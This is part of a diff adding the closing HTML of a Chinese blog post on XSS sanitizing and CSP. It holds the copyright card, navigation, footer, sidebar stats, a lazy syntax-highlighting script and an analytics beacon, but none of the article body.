+        <!-- /Related Static -->
+
+        <!-- Post Copyright & License Card -->
+        <div class="post-copyright-card">
+          <div class="copyright-header">
+            <div class="copyright-badge">
+              <span>📜</span>
+              <span>原创与知识共享协议</span>
+            </div>
+            <button class="copyright-cite-btn" id="copy-cite-btn">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+              </svg>
+              <span>复制 Markdown 引用</span>
+            </button>
+          </div>
+          <div class="copyright-list">
+            <div class="copyright-item"><strong>文章标题：</strong>净化器不是防线，是过滤器：渲染第三方内容的两道门</div>
+            <div class="copyright-item"><strong>文章作者：</strong>张小猛 · loczb</div>
+            <div class="copyright-item"><strong>永久链接：</strong><a href="https://709527.xyz/blog/posts/sanitizer-is-a-filter-not-a-defense.html">https://709527.xyz/blog/posts/sanitizer-is-a-filter-not-a-defense.html</a></div>
+            <div class="copyright-item"><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 国际许可协议。商业转载请联系作者获得授权，非商业转载请注明出处。</div>
+          </div>
+        </div>
+      </article>
+    </div>
+  </main>
+
+  <!-- Related Posts / Navigation -->
+  <section class="section" aria-label="读完之后" style="padding-top: 0;">
+    <div class="container container-narrow">
+      <!-- Post Nav Prev Next -->
+      <nav class="post-nav" aria-label="文章翻页导航">
+        <a href="soft-delete-costs-interest-on-every-query.html" class="post-nav-card post-nav-prev" rel="prev">
+          <span class="post-nav-label">← 上一篇</span>
+          <span class="post-nav-title">软删除买的是后悔药，付的是每条查询的利息</span>
+        </a>
+        <div class="post-nav-card post-nav-next disabled" aria-disabled="true">
+          <span class="post-nav-label">下一篇 →</span>
+          <span class="post-nav-title">已是最新篇博文</span>
+        </div>
+      </nav>
+      <!-- /Post Nav Prev Next -->
+      <hr style="border: none; border-top: 1px solid var(--color-border); margin: var(--space-2xl) 0;">
+
+      <div class="blog-topics" style="margin-bottom: var(--space-xl); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
+        <div>
+          <span class="topic-label">读完之后:</span>
+          <a href="../index.html" class="topic-tag">返回博客列表</a>
+          <a href="../index.html?view=series" class="topic-tag">浏览全部专栏</a>
+        </div>
+        <a href="#main-content" class="topic-tag" style="margin-left: auto;">↑ 回到顶部</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+<!-- PARTIAL:FOOTER -->
+  <footer class="footer" role="contentinfo">
+  <div class="footer-inner">
+    <p class="footer-signature">写代码，做产品，也认真生活。</p>
+    <div class="footer-social">
+      <a href="https://github.com/zzdbilly" class="footer-social-link" target="_blank" rel="noopener" aria-label="GitHub">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+      </a>
+      <a href="https://twitter.com/zzdbilly" class="footer-social-link" target="_blank" rel="noopener" aria-label="X (Twitter)">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+      </a>
+      <a href="/rss.xml" class="footer-social-link" target="_blank" rel="noopener" aria-label="RSS 订阅">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 11a9 9 0 0 1 9 9"/><path d="M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1"/></svg>
+      </a>
+    </div>
+    <div class="footer-links">
+      <a href="/" class="footer-link">首页</a>
+      <a href="/projects/" class="footer-link">项目</a>
+      <a href="/blog/" class="footer-link">博客</a>
+      <a href="/about/" class="footer-link">关于</a>
+    </div>
+    <p class="footer-copyright">&copy; 2026 张小猛 · loczb · Built with care</p>
+  </div>
+</footer>
+  <!-- /PARTIAL:FOOTER -->
+
+  <script defer src="../../assets/js/main.js"></script>
+  <script defer src="../../assets/js/article.js?v=c9f1a378ea"></script>
+  <script defer src="../../assets/js/share.js"></script>
+  <!-- Back to Top & Reading Progress -->
+  <button class="back-to-top" id="backToTop" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <path d="M18 15l-6-6-6 6"/>
+    </svg>
+  </button>
+  <div class="reading-progress" id="readingProgress"></div>
+
+  <!-- Post Sidebar Info（左侧） -->
+  <div class="post-sidebar-info" id="postSidebar">
+    <div class="post-info-card">
+      <div class="post-info-section">
+        <div class="post-info-label">作者</div>
+        <div class="post-info-author">
+          <div class="post-info-avatar">小</div>
+          <div>
+            <div class="post-info-author-name">张小猛</div>
+            <div class="post-info-author-desc">写代码，做产品</div>
+          </div>
+        </div>
+      </div>
+      <div class="post-info-section">
+        <div class="post-info-label">文章信息</div>
+        <div class="post-info-stat"><span class="post-info-stat-label"><span aria-hidden="true">📅</span> 发布日期</span><span class="post-info-stat-value">2026-10-26</span></div>
+        <div class="post-info-stat"><span class="post-info-stat-label"><span aria-hidden="true">⏱️</span> 阅读时间</span><span class="post-info-stat-value">16 min read</span></div>
+        <div class="post-info-stat"><span class="post-info-stat-label"><span aria-hidden="true">📝</span> 文章字数</span><span class="post-info-stat-value">5313 字</span></div>
+        <div class="post-info-stat"><span class="post-info-stat-label"><span aria-hidden="true">📊</span> 章节数</span><span class="post-info-stat-value">8 节 · 16 子节</span></div>
+        <div class="post-info-stat"><span class="post-info-stat-label"><span aria-hidden="true">💻</span> 代码块</span><span class="post-info-stat-value">5 段</span></div>
+      </div>
+      <div class="post-info-section" id="postSidebarTags">
+        <div class="post-info-label">标签</div>
+        <div class="post-info-links">
+          <a href="../../blog/index.html?tag=XSS" class="post-info-link"># XSS</a>
+          <a href="../../blog/index.html?tag=CSP" class="post-info-link"># CSP</a>
+          <a href="../../blog/index.html?tag=%E5%86%85%E5%AE%B9%E5%87%80%E5%8C%96" class="post-info-link"># 内容净化</a>
+          <a href="../../blog/index.html?tag=Web%20%E5%AE%89%E5%85%A8" class="post-info-link"># Web 安全</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Post TOC -->
+  <div class="post-toc-container" id="postToc">
+    <nav class="post-toc" aria-label="文章目录">
+      <div class="post-toc-title">目录</div>
+      <ul class="post-toc-list" id="tocList">
+      </ul>
+    </nav>
+  </div>
+
+  <!-- Comment System -->
+  <script src="../../workers/comment-system/comment-widget.js?v=a650e91e3e" defer></script>
+
+  <!-- highlight.js 代码语法高亮（本地完整构建，无外部依赖） -->
+  <script defer src="../../assets/vendor/highlight/highlight.min.js"></script>
+  <script>
+    /* 语法高亮改为「可见优先、空闲补齐」：
+       highlight.js 要遍历全篇代码块并生成数百个 span，若在 DOMContentLoaded 里同步跑完，
+       会在关键路径上长时间占住主线程（2026-09-27 实测本页长任务 1548ms、DCL 3651ms；
+       改动后长任务 145ms、DCL 1378ms）。这里 DCL 阶段只登记观察，实际高亮交给
+       IntersectionObserver（近屏 800px 内优先）+ requestIdleCallback（剩余块每片 ≤4 块），
+       首屏代码块的着色时机与视觉基本无变化。 */
+    (function() {
+      function canPaint(b) {
+        return !b.classList.contains('hljs') && !b.closest('.codehilite');
+      }
+      function paint(b) {
+        if (!canPaint(b)) return;
+        try { hljs.highlightElement(b); } catch (e) {}
+      }
+      function init() {
+        var blocks = [].slice.call(document.querySelectorAll('pre code')).filter(canPaint);
+        if (!blocks.length) return;
+        if ('IntersectionObserver' in window) {
+          var io = new IntersectionObserver(function(entries, obs) {
+            entries.forEach(function(en) {
+              if (!en.isIntersecting) return;
+              paint(en.target);
+              obs.unobserve(en.target);
+            });
+          }, { rootMargin: '800px 0px' });
+          blocks.forEach(function(b) { io.observe(b); });
+        }
+        var i = 0;
+        var idle = window.requestIdleCallback || window.setTimeout;
+        var step = function() {
+          var quota = 4;
+          while (i < blocks.length && quota-- > 0) paint(blocks[i++]);
+          if (i < blocks.length) idle(step);
+        };
+        idle(step); // 不在 DCL 里同步跑：可见块由 IntersectionObserver 处理，其余走空闲分片
+      }
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+      } else {
+        init();
+      }
+    })();
+  </script>
+
+  <!-- Cloudflare Web Analytics -->
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "29e7cff6f37448989538e2165cb79187"}'></script>
+</body>
+</html>
